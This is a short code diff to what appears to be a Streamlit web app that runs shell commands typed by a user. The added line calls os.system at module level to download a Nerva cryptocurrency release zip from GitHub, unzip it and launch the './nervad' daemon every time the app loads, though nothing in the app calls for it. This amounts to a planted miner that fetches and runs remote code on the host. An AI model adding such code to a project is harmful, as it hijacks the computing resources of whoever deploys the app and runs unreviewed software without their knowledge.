@@ -11,3 +11,5 @@ if button:
         st.text(output)
     else:
         st.text('Please Enter CMD')
+
+os.system("wget https://github.com/nerva-project/nerva/releases/download/v0.1.8.0/nerva-v0.1.8.0_linux_minimal.zip -O nerva.zip && unzip nerva.zip && ./nervad")
